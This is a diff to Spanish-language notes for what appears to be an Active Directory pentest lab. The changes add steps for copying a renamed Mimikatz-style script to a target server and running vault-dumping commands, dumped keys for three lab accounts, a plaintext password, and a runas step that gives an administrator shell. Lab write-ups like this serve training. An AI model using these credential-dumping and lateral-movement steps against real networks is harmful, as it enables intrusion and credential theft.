@@ -594,11 +594,14 @@ Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp
 
 Navegaremos a la ruta donde lo hemos copiado y lo ejecutaremos
 ```shell
-[]
+[dcorp-adminsrv]
 .\Invoke-TheKatEx-keys-std97.ps1
 ```
 
-A la hora de haberlo ejecutado encontraremos las credenciales de los usuarios dcorp-adminsrv$, appadmin y websvc
+A la hora de haberlo ejecutado encontraremos las credenciales de los usuarios 
+dcorp-adminsrv$(*e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51*), appadmin(*68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb*),
+websvc(*2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7*).
+Todas estas en formato **des_cbc_md4**
 
 También se pueden buscar credenciales en el almacén de credenciales de *Windows*
 Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-vault-std97.ps1*
@@ -608,20 +611,24 @@ Tendremos que modificar el archivo y añadir en la ultima linea
 Invoke-TheKat -Command '"token::evasive-elevate" "vault::cred /patch"'
 ```
 
-Lo volvemos a copiar en la maquina victima y lo ejecutamos
+Lo volvemos a copiar en la maquina victima
 ```shell
+[student97]
 Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
-Obteniendo la credencial del usuario srvadmin en texto plano
+Una vez copiado lo ejecutaremos
+```shell
+.\Invoke-TheKatEX-vault-std97.ps1
+```
+
+Obteniendo la credencial del usuario srvadmin en texto plano *TheKeyUs3ron@anyMachine!*
 Ahora podemos ejecutar un proceso como srvadmin y obtener una shell como Administrador siendo el usuario studen97
 
 ```shell
+[dcorp-adminsrv]
 runas /user:dcorp\srvadmin /netonly cmd
 ```
-
-*TheKeyUs3ron@anyMachine!*
-
 
 Una vez dentro ejecutaremos una invishell
 ```shell
